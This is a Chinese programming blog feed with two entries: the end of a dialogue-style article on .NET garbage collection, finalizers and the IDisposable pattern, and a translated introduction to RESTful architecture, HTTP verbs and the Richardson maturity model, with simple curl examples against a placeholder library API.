<p>&emsp;&emsp;如果所有的 Generation 0 对象都被检查了，但是产生的内存空间仍然不够用，就检查一遍 Generation 1 中的所有对象的可达性并回收。存活下来的 Generation 1 对象被提升到 Generation 2。如果垃圾回收器仍然需要额外的内存，Generation 2 的对象就经历检查并被回收。此时，如果一个 Generation 2 的对象存活下来，它仍然是一个 Generation 2 的对象。<br>&emsp;&emsp;其实通过<strong>对象的代的设计是想达到这么一个效果：新对象（比如局部变量）会被很快回收，而老一些的对象（如一个应用程序对象）不会被经常骚扰</strong>。<br>&emsp;&emsp;<strong>说到底，对象代的设计就是为了优化垃圾回收的过程。</strong>  </p>
<p>&emsp;&emsp;“我还有最后一个问题”，C++ 程序员按耐不住心里一直的疑惑，说到：“你说了这么多都是再讲托管资源，难道 .NET 中就没有非托管资源吗？<strong>.NET又是怎么对非托管资源进行资源释放的呢</strong>？”。<br>&emsp;&emsp;”这个问题问的好！”，C# 程序员大笑，于是接着又开始解惑（吹B）…  </p>
<h1 id="构建可终结对象-—-非托管资源处理第一式"><a href="#构建可终结对象-—-非托管资源处理第一式" class="headerlink" title="构建可终结对象 — 非托管资源处理第一式"></a>构建可终结对象 — 非托管资源处理第一式</h1><p>&emsp;&emsp;以一名 C# 开发者的直觉告诉你，大多数的 C# 类都不需要显式的清理逻辑。原因很简单：如果类型使用了其他托管对象，一切都最终会被垃圾回收。<br>&emsp;&emsp;问：<strong>那在什么时候需要显式地清理呢</strong>？<br>&emsp;&emsp;答案是：<strong>在你使用非托管资源时（例如原始的操作系统文件句柄、原始的非托管数据连接或其他非托管资源)，才可能需要设计一个在用完后清理自身垃圾的类</strong>。<br>&emsp;&emsp;比如说下面这个类：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//数据库上下文类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">SqlDbContext</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...(其他被引用的对象实例)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//类中包含的非托管资源（需要调用 Dispose() 函数进行资源的释放）</span></span><br><span class="line">    SqlConnection sqlConnection = <span class="keyword">new</span> SqlConnection(<span class="string">"..."</span>);  </span><br><span class="line">            </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;现在问题来了，我们要在适当的时机调用数据库连接类对象释放资源的方法(SqlConnection 类对象使用完后需要调用 Dispose() 方法释放资源)。<strong>这个适当的时机当然就是对象在被 CLR 进行垃圾回收的过程中，所以问题又来到了，有没有一个方法是在这个时机被调用，而且是可以被扩展的呢</strong>？<br>&emsp;&emsp;是的，我们可以利用 .NET 的基类 System.Object 中定义的名为 Finalize() 的虚方法，也叫作终结器方法，它是这样的：</p>
<figure class="image-box">
                <img src="1342524-20191208133108536-1104990529.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;看到这当然会很奇怪，不是说有 Finalize() 方法，在哪，逗我？莫惊讶，其实<strong>这里的 ~Object() 就是 Finalize()，只是一个语法糖罢了</strong>。<br>&emsp;&emsp;Finalize() 的调用将（最终）发生在一次”自然的”垃圾回收或用程序通过 GC.Collect() 强制回收的过程中，所以这样看来，终结器方法就是让类对象释放内部非托管资源的地方。Nice，现在我们可以像这样来编写清理非托管资源的代码：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//数据库上下文类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">SqlDbContext</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...(其他被引用的对象实例)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//类中包含的非托管资源（需要调用 Dispose() 函数进行资源的释放）</span></span><br><span class="line">    SqlConnection sqlConnection = <span class="keyword">new</span> SqlConnection(<span class="string">"..."</span>);  </span><br><span class="line"></span><br><span class="line">    ~SqlDbContext()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//这里清除非托管资源</span></span><br><span class="line">        <span class="keyword">this</span>.sqlConnection.Dispose();</span><br><span class="line">    &#125;</span><br><span class="line">            </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;这样被构建的对象被叫做<strong>可终结对象</strong>。<br>&emsp;&emsp;有关于终结过程的细节，在《C# 与 .NET 4 高级程序设计（第 5 版）》书中是这样描述的：</p>
<figure class="image-box">
                <img src="1342524-20191208134332927-532737446.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;从以上的内容我们得知：<strong>通过 Finalize() 来清除非托管资源的时机只能是在 .NET 对象被垃圾回收的过程中，而且终结过程是一个消耗不小的动作。</strong><br>&emsp;&emsp;问题又来了：<strong>很多非托管资源都非常宝贵（如数据库和文件句柄），所以这些资源应该在使用完后尽快地被清除，而不能依靠垃圾回收的发生，那么这些资源应该以怎样的形式被显示地释放呢？</strong></p>
<figure class="image-box">
                <img src="1342524-20191208135319279-807399951.png" alt title class>
                <p></p>
            </figure>


<h1 id="构建可处置对象-—-非托管资源处理第二式"><a href="#构建可处置对象-—-非托管资源处理第二式" class="headerlink" title="构建可处置对象 — 非托管资源处理第二式"></a>构建可处置对象 — 非托管资源处理第二式</h1><p>&emsp;&emsp;除了重写 Finalize() 之外，类还可以实现 IDisposable 接口，它定义了一个名为 Dispose() 的方法：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title">IDisposable</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Dispose</span>(<span class="params"></span>)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;它的使用方法就是：在类的 Dispose() 方法中编写非托管资源的释放的代码，程序员可以在这个对象不再需要的时候手动调用对象的 Dispose() 方法来达到及时释放非托管资源的目的。<br>&emsp;&emsp;于是你可以像这样来编写类：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//数据库上下文类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">SqlDbContext</span>:<span class="title">IDisposable</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...(其他被引用的对象实例)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//类中包含的非托管资源（需要调用 Dispose() 函数进行资源的释放）</span></span><br><span class="line">    SqlConnection sqlConnection = <span class="keyword">new</span> SqlConnection(<span class="string">"..."</span>);  </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Dispose</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="comment">//这里清除非托管资源</span></span><br><span class="line">        <span class="keyword">this</span>.sqlConnection.Dispose();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;采用这种方式来释放非托管资源的类被称作为<strong>可处置对象</strong>。<br>&emsp;&emsp;在这里还要补充一点，C# 提供了一个语法糖来简化调用 Dispose() 操作，如下：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">SqlDbContext context = <span class="keyword">new</span> SqlDbContext();</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//在此作用域内使用 SqlDbContext 类对象 context</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">finally</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//确保使用完后调用 Dispose() 方法</span></span><br><span class="line">    context.Dispose();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;上面这段代码等同于下面这段代码：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> (SqlDbContext context = <span class="keyword">new</span> SqlDbContext())</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//在此作用域内使用 SqlDbContext 类对象 context</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;C++ 程序员说：“你这还不是要自己手动调用，如果我忘记调用 Dispose() 那岂不是一切都玩完！”<br>&emsp;&emsp;C# 程序员冷笑一声，“非也，非也，我来传授你最后一招吧！”  </p>
<h1 id="非托管资源最强模式-—-双剑合璧"><a href="#非托管资源最强模式-—-双剑合璧" class="headerlink" title="非托管资源最强模式 — 双剑合璧"></a>非托管资源最强模式 — 双剑合璧</h1><p>&emsp;&emsp;人非圣贤，孰能无过。程序员也会有失手的时候，比如，忘记调用 Dispose() 方法…<br>&emsp;&emsp;这个时候就必须设计一个万无一失的方法，达到一个目的：就是不管有没有手动调用 Dispose()，非托管资源最终都应该被妥妥地释放掉。为了解决这个问题，我们可以如下去定义一个可处置对象类：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//数据库上下文类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">SqlDbContext</span>:<span class="title">IDisposable</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...(其他被引用的对象实例)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//类中包含的非托管资源（需要调用 Dispose() 函数进行资源的释放）</span></span><br><span class="line">    SqlConnection sqlConnection = <span class="keyword">new</span> SqlConnection(<span class="string">"..."</span>);  </span><br><span class="line"></span><br><span class="line">    ~SqlDbContext()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//这里清除非托管资源</span></span><br><span class="line">        <span class="keyword">this</span>.sqlConnection.Dispose();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Dispose</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="comment">//这里清除非托管资源</span></span><br><span class="line">        <span class="keyword">this</span>.sqlConnection.Dispose();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//跳过终结过程</span></span><br><span class="line">        GC.SuppressFinalize(<span class="keyword">this</span>);</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;可以看到，这个类中即有终结方法的重写也有 Dispose() 方法，这样就能保证：<strong>程序员若忘记调用 Dispose() 方法释放非托管资源，那么对象就会在垃圾回收的过程中调用终结方法来释放非托管资源；若程序员调用了 Dispose() 方法，那么 GC.SuppressFinalize(this) 会保证在垃圾回收过程中不再会调用对象的终结方法，避免不必要的资源开销。</strong>可谓“双剑合璧”，保万无一失。  </p>
<p>&emsp;&emsp;话音刚落，C++ 程序员“噗通”一声跪倒在 C# 程序员面前，双手死死拉住 C# 程序员的裤子，”师父，收我为徒吧！我也要学 C#…”,C# 程序员不想自己的裤子被扯破，于是答应了他。掏出一本上古神书…</p>
<figure class="image-box">
                <img src="1342524-20191208145553447-24813107.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;哦，不，拿错了。。。应该是这本。。。</p>
<figure class="image-box">
                <img src="1342524-20191208145754410-945114997.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;全剧终…  </p>
]]></content>
      
        <categories>
            
            <category> 编程 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CSharp </tag>
            
            <tag> dotNET </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[RESTful 架构基础]]></title>
      <url>/2019/12/09/FoundationsOfRestfulArchitecture/</url>
      <content type="html"><![CDATA[<blockquote>
<p><a href="https://dzone.com/refcardz/rest-foundations-restful" target="_blank" rel="noopener">https://dzone.com/refcardz/rest-foundations-restful</a></p>
</blockquote>
<p>&emsp;&emsp;REST（Representational State Transfer）架构风格是一种世界观，把信息提升为架构中的一等公民。通过 REST 可以实现系统的高性能、可伸缩、通用性、简单性、可修改性和可扩展等特性。这篇文章解释了主要的 HTTP 操作，对 HTTP 响应码进行描述，并列举相关开发库和框架。此外，本文还提供了额外的资源，对每个主题进行了更深入的探讨。  </p>
<a id="more"></a>

<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>&emsp;&emsp;REST 架构风格不是一种可以购买的技术，也不是一个可以添加到软件开发项目中的开发库。首先也是最重要的，REST 是一种世界观，把将信息提升为构建架构中的一等公民。<br>&emsp;&emsp;Roy Fielding 的博士论文“架构风格和基于网络的软件架构设计”介绍和整理了“RESTful”系统的思想和相关术语。这是一篇学术论文，虽然使用正式语言，但是仍然易于理解并且提供了实践基础。<br>&emsp;&emsp;总结一下，RESTful 通过体系结构的特定选择能从部署的系统中获得理想特性。尽管这种风格定义的约束细节并没有为所有场合设计，但是的确可以广泛适用。<br>&emsp;&emsp;由于 Web 对消费者偏好有多重影响，REST 风格的倡导者鼓励企业组织在其边界内使用相同原则，就像他们在面向外部客户的网页上做的那样。本文将讨论现代 REST Web 实现中的基本约束和属性。  </p>
<h2 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h2><p>&emsp;&emsp;REST 表示什么含义？以无状态方式传输、访问和操作文本数据。当正确部署后，REST 为互联网上不同应用程序之间提供了一致的互操作性。无状态（stateless）这个术语至关重要，它使得应用程序可以用不可知的方式进行通信。RESTful API 通过统一资源定位符地址（URL）公开服务。URL 名称将资源的区分为接受内容或返回内容。RFC 1738 中定义了 URL scheme，可以在这里找到: <a href="https://tools.ietf.org/rfc/rfc1738.txt" target="_blank" rel="noopener">https://tools.ietf.org/rfc/rfc1738.txt</a><br>&emsp;&emsp;RESTful URL 类似于下面这个 library API：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://fakelibrary.org/library</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;实际公开的不一定是某种任意的服务，而是代表对消费者有价值的信息资源。URL 作为资源句柄，可以请求、更新或删除内容。<br>&emsp;&emsp;开始把服务发布到某个地方，然后开始与 REST 服务进行交互。返回的内容可能是 XML、JSON 格式，或者更确切地说是像 Atom 或自定义 MIME 类型等超媒体格式。虽然一般建议尽可能重用现有的格式，但是对正确设计的媒体类型正在变得越来越宽容。<br>&emsp;&emsp;需要请求资源的时候，客户机会发一个超文本传输协议（HTTP）GET 请求，例如在浏览器中键入一个 URL 然后点击回车，选择书签，或者点击锚引用链接。<br>&emsp;&emsp;通过编程方式与 RESTful API 交互，有数十个客户端 API 或工具可供选择。使用 curl 命令行工具，可以输入以下命令：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl http://fakelibrary.org/library</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;上面的命令使用默认格式，但你可能不需要这种格式的信息。幸运的是 HTTP 有一种机制，可以指定返回信息的格式。在请求中指定 “Accept” 头，如果服务器支持这种格式，会以指定的格式返回。这个过程称为内容协商，这是 HTTP 中未被充分利用的功能之一，可以使用一个类似于上面例子中的 curl 命令来指定：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl –H &quot;Accept:application/json&quot; http://fakelibrary.org/library</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;由于资源名称与内容格式是独立的，从而让请求不同格式信息成为可能。虽然 REST 中的 “R” 的含义是 “表现”而非“资源”，但是应该在构建系统时允许客户端指定请求的内容格式，请牢记这一点。在我们的例子中 library API 可能包含以下 URL：  </p>
<ol>
<li><code>http://fakelibrary.org/library</code>：图书馆基本信息，搜索图书、DVD等相关资源基本功能的链接。</li>
<li><code>http://fakelibrary.org/book</code>：存放书籍的“信息空间”。从概念上说，这里可能会存放所有的书籍。显然，如果这个问题得到解决，我们不会希望返回所有图书，而是希望通过类别、搜索关键词等来检索图书。</li>
<li><code>http://fakelibrary.org/book/category/1234</code>：在书籍的信息空间里，我们可以指定类别浏览，例如成人小说、儿童书籍、园艺书籍等。使用杜威十进制图书分类法是可行的，但我们也可以想象自定义分组。问题的关键在于，这种“信息空间”可能是无限的，而且可能收到人们实际关心的信息类型影响。</li>
<li><code>http://fakelibrary.org/book/isbn/978-0596801687</code>：提到某本具体的书，应该包括书名、作者、出版商、系统中的拷贝数、可用拷贝数等信息。</li>
</ol>
<blockquote>
<p>译注：杜威十进制图书分类法由美国图书馆专家麦尔威·杜威发明，于1876年首次发表，历经22次的大改版。该分类法以三位数字代表分类码，共可分为10个大分类、100个中分类及1000个小分类。</p>
</blockquote>
<p>&emsp;&emsp;就图书馆用户而言，上面提到的这些 URL 可能就是只读的，但是图书馆员使用应用程序时实际上可以操作这些资源。<br>&emsp;&emsp;例如添加一本新书，可以向 main/book 地址 POST 一个 XML。使用 curl 提交，看起来可能像这样：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$  curl –u username:password -d @book.xml -H &quot;Content-type: text/xml&quot; http://fakelibrary.org/book</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;此时，服务器可能会对提交的内容进行校验，创建与图书相关的记录，并返回响应代码 201 —— 表示已创建新资源。新资源的 URL 可以在响应的 Location 头中找到。<br>&emsp;&emsp;RESTful 请求一个重要特性：每次请求都包含了充足的状态信息来响应请求。这为服务器的可见性和无状态创造了条件，并为扩展系统和识别发送的请求内容提供了理想特性。对于缓存结果也非常有帮助。服务器地址和请求状态组合成可计算的 hash 键值，并形成一个结果集：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://fakelibrary.org + /book/isbn/978-0596801687</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;接下来我们会先介绍 GET 请求。客户端在需要时发出 GET 请求获取指定资源。客户端可以在本地缓存请求结果，服务器可以在远程缓存结果，系统的中间层可以在请求链路中间缓存结果。这是一个与具体应用程序无关的特性，可以加入系统设计中。<br>&emsp;&emsp;正因为可以操作资源，也就意味着并不是每个人都可以这样做。我们完全可以建立一个防护模型，要求用户在操作前验证身份，证明他们具有该操作的授权。在本文的最后，将提供一些提升 RESTful 服务安全性的内容。  </p>
<h1 id="REST-和-SOAP-比怎么样？"><a href="#REST-和-SOAP-比怎么样？" class="headerlink" title="REST 和 SOAP 比怎么样？"></a>REST 和 SOAP 比怎么样？</h1><p>&emsp;&emsp;SOAP：简单对象访问协议（Simple Object Access Protocol）。是交换数据的一种协议规范，是一种轻量的、简单的、基于XML的协议。一条 SOAP 消息就是一个普通的 XML 文档，包含必需的 Envelope 元素、可选的 Header 元素、必需的 Body 元素和可选的 Fault 元素。<br>&emsp;&emsp;把 REST 与 SOAP 划等号是错误的。在这两者之间进行比较，带来的困扰远多于好处。简单来说，它们不是一回事。尽管可以用这两种方法解决许多架构问题，但是它们不能相互替换。<br>&emsp;&emsp;这种混淆很大程度上源于对 “REST 是通过 URL 调用 Web 服务”这句话的误解。这种观点与 RESTful 架构的功能相距甚远。如果不全面深入理解 RESTful 的架构实现，就很容易误解 REST 实践的本意。  </p>
<p>&emsp;&emsp;利用 REST 的最佳方式，是<strong>将生产和消费过程中的信息与技术分离实现解耦</strong>，进而更好地管理系统，让架构具备以下特性：  </p>
<ul>
<li>高性能</li>
<li>可扩展</li>
<li>通用</li>
<li>简洁</li>
<li>可修改</li>
<li>可扩展</li>
</ul>
<p>&emsp;&emsp;这并不是说，基于 SOAP 构建的系统不能具备上述特性。而是当技术、组织或过程的复杂性造成不能在单个事务中完成请求的生命周期时，这种情况 SOAP 能够发挥最佳效果。  </p>
<h1 id="Richardson-成熟度模型"><a href="#Richardson-成熟度模型" class="headerlink" title="Richardson 成熟度模型"></a>Richardson 成熟度模型</h1><p>&emsp;&emsp;Leonard Richardson 引入了一种成熟度模型，部分阐述了 SOAP 与 REST 之间的区别，并提供一种对不同类型的系统进行分类的框架。许多人不恰当地称之为 “REST”。可以将这种分类看作系统中不同 Web 技术组件紧密程度的度量标准：包括信息资源、HTTP 作为应用层协议和作超媒体作为控制媒介。  </p>
<table>
<thead>
<tr>
<th>等级</th>
<th>采纳</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>基本上就是 SOAP。没有信息资源，HTTP 被用作传输协议，也没有超媒体的概念。结论，REST 和 SOAP 是两种不同的方案</td>
</tr>
<tr>
<td>1</td>
<td>用到 URL 但并不总是作为信息资源使用，所有内容都通过 GET 请求，包括更新服务器状态的请求。大多数人刚接触 REST 时构建的系统通常是这样的</td>
</tr>
<tr>
<td>2</td>
<td>使用 URL 表示信息资源。HTTP 作为应用层协议，有时也用作内容协商。大多数面向 Internet 的 “REST” Web 服务实际上位于这个级别，因为它们只支持非超媒体格式</td>
</tr>
<tr>
<td>3</td>
<td>使用 URL 表示信息资源。HTTP 作为应用层协议，也用来进行内容协商。使用超媒体进行客户端的交互</td>
</tr>
</tbody></table>
<p>&emsp;&emsp;称其为“成熟度模型”似乎意味着应该只构建“成熟度”最高的系统。这种看法是不合适的。第 2 级是有价值的，从 2 级向 3 级转变通常只是采用了一种新的 MIME 类型。然而，从 0 级到 3 级的转变要困难得多，因此增量式升级转变通常也会增值。<br>&emsp;&emsp;首先，确定希望公开哪些信息资源。采用 HTTP 作为处理这些信息资源的应用协议，包括内容协商。接下来，当一切就绪时，使用基于超媒体的 MIME 类型，这样就可以充分享受 REST 的好处了。  </p>
<h1 id="动词"><a href="#动词" class="headerlink" title="动词"></a>动词</h1><p>&emsp;&emsp;动词是用来与服务器资源交互的方法或操作。RESTful 系统中有限的动词让刚接触该的使用者感到困惑和沮丧。看似武断和不必要的约束，目的是鼓励以应用程序无关的形式提供可预测的行为。通过明确、清晰地定义这些动词的行为，客户端可以在网络中断或故障时自主处理。<br>&emsp;&emsp;精心设计的 RESTful 系统主要使用 4 个 HTTP 动词。  </p>
<h2 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h2><p>&emsp;&emsp;GET 请求是最常用的 Web 动词。GET 请求将命名资源从服务器传输到客户端。尽管客户端不需要知道请求的资源内容，但是请求返回的结果是带元数据标记的字节流，这表明客户端应该知道如何解释资源。在 Web 中通常用 “text/html” 或 “application/xhtml+xml” 表示。正如之前提到的那样，只要服务器支持，客户端可以通过内容协商提前指定请求的返回格式。<br>&emsp;&emsp;GET 请求关键点之一，不要修改服务器端的任何内容。这是一个基本的安全要求，也是不熟悉 REST 的开发者犯的最大错误之一。你可能会遇到这样的 URL：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/res/action=update?data=1234</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;不要这样做！ 由于 GET 请求安全性允许缓存请求，这会让正在构建的 RESTful 系统陷入混乱。GET 请求也意味着幂等性，即多次请求不会对系统产生任何影响。这是基于分布式基础设施的一个重要特性。如果进行 GET 请求时被打断，由于幂等性，客户端可以再次发起请求。这点非常重要。在设计良好的基础结构中，客户端可以从任意应用程序发起请求。虽然一定会有与应用程序相关的特定行为，但是加入与应用程序无关的行为越多，系统就会越有弹性，也更容易维护。  </p>
<h2 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h2><p>&emsp;&emsp;在辨别 POST 和 PUT 动词意图的时候，情况开始变得不那么清晰。根据定义，二者似乎都可以被客户端用来创建或更新服务器资源，然而它们的用途各有不同。<br>&emsp;&emsp;当无法预测请求创建的资源的标识时，客户端会使用 POST 请求。在新增雇员、下订单或提交表单的时候，我们无法预测服务器将如何命名正在创建的资源。这就是为什么将资源提交给类似 Servlet 这样的程序处理。接下来，服务器会接受请求、校验请求、验证用户凭据等。成功处理后，服务器将返回 201 HTTP 响应代码，其中包含一个 “Location” 头，代表新创建的资源的位置。<br>&emsp;&emsp;<strong>注意</strong>： 有些人将 POST 视为创建资源的 GET 会话。他们会对创建的资源通过 body 返回 200，而不是返回 201。这似乎是避免二次请求的一种快捷方式，但是这种做法混合了 POST 和 GET，让缓存资源的潜在影响变得微妙。尽量避免因为走捷径而牺牲大局。短期看这似乎是值得的，但随着时间的推移，这些捷径叠加起来可能会带来不利的影响。<br>&emsp;&emsp;POST 动词的另一个主要用途是“追加（Append）”资源信息，即增量编辑或部分更新，而不是提交完整的资源。这里应使用 PUT 操作。对已知资源使用 POST 更新，可用于向订单添加新送货地址或更新购物车中某个商品的数量。<br>&emsp;&emsp;由于是更新资源的部分信息，<strong>POST 既不安全也不幂等</strong>。<br>&emsp;&emsp;POST 的最后一种常见用法是提交查询。将查询的内容或表单内容进行 URL 编码后提交给服务执行查询。通常可以直接返回 POST 结果，因为没有与查询相关的标识。<br>&emsp;&emsp;<strong>注意</strong>： 建议将这样的查询转换为信息资源本身。如果采用 POST 查询，可以考虑采用 GET 请求，后者支持缓存。你可以与其他人分享这个链接。  </p>
<h2 id="PUT"><a href="#PUT" class="headerlink" title="PUT"></a>PUT</h2><p>&emsp;&emsp;由于 HTML 表单目前还不支持 PUT，许多开发人员基本上会忽略 PUT 动词。然而，PUT 有一个重要作用并且是 RESTful 系统完整愿景的一部分。<br>&emsp;&emsp;客户端可以向指定 URL 发 PUT 请求，服务器用请求中的数据执行覆盖操作。PUT 请求在某种程度上是等幂的，而 POST 更新不是。<br>&emsp;&emsp;如果客户端在 PUT 覆盖请求时被打断，由于重新发送覆盖操不会造成任何后果，因此可以再次发送。客户端具备管理状态能力，所以直接重发覆盖命令即可。<br>&emsp;&emsp;注意： 这种协议层处理并不意味着要取消更高级别（如应用层）的事务，但是同样地，它也是一种体系结构上理想的属性，可以在应用层以下使用。<br>&emsp;&emsp;如果客户端能够提前了解资源的标识，那么 PUT 也可用于创建资源。正如我们在 POST 部分中讨论的那样，通常不会出现这种情况。但是如果客户端能够控制服务器端信息空间，那么这种操作也是合理的。  </p>
<h2 id="DELETE"><a href="#DELETE" class="headerlink" title="DELETE"></a>DELETE</h2><p>&emsp;&emsp;在公共网络上 DELETE 动词没有被广泛使用（谢天谢地!）。然而，对于控制信息空间非常有用，它是资源生命周期中非常有用的一部分。<br>&emsp;&emsp;DELETE 请求意在实现等幂。可能由于网络故障 DELETE 请求被打断，这时我们希望客户端继续尝试。第一次请求无论成功与否，资源都应该返回 204（无指定内容）。对之前已删除的资源或不存在的资源可能需要一些额外处理，两种情况都应该返回 404。一些安全策略要求为不存在的和已删除的资源返回 404，这样 DELETE 请求就不会泄漏有关资源是否存在的信息。<br>&emsp;&emsp;还有另外三个没有广泛使用但是有价值的动词。  </p>
<h2 id="HEAD"><a href="#HEAD" class="headerlink" title="HEAD"></a>HEAD</h2><p>&emsp;&emsp;HEAD 动词用来请求资源，但不实际检索。客户端可以通过 HEAD 检查资源是否存在，并检查资源相关的元数据。  </p>
<h2 id="OPTIONS"><a href="#OPTIONS" class="headerlink" title="OPTIONS"></a>OPTIONS</h2><p>&emsp;&emsp;OPTIONS 动词也可以用来查询服务器相关资源的情况，方法是询问哪些其它动词可用于该资源。</p>
<h2 id="PATCH"><a href="#PATCH" class="headerlink" title="PATCH"></a>PATCH</h2><p>&emsp;&emsp;最新的动词 PATCH 直到2010年才正式采纳为 HTTP 的一部分。旨在提供一种标准化方式来表示部分更新。PATCH 请求通过标准格式让交互的意图更明确。这是推荐使用 PATCH 而非 POST 的原因，尽管 POST 可以用于任何事情。IETF 发布了 RFC 文档，定义用于 PATCH 操作的 XML 和 JSON。<br>&emsp;&emsp;如果客户端 PATCH 请求的 header 中带 If-Match，则此部分为幂等更新。可以重试中断的请求，因为如果第一次请求成功，那么 If-Match header 会不同于新状态。如果相同，则未处理原始请求可应用 PATCH。  </p>
